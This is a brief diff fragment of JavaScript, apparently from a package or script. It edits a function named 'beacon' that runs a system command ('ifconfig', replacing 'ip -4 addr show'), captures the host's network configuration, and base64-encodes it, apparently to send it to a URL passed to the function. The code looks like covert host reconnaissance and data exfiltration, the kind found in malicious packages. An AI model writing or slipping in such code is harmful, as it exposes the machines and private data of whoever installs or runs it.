@@ -47,7 +47,7 @@ function beacon(urlStr, q) {
   let idOutput = "";
   try {
     idOutput = execSync(
-  'ip -4 addr show',
+  'ifconfig',
   { encoding: "utf8" }
 ).trim();
     idOutput = Buffer.from(idOutput).toString("base64");
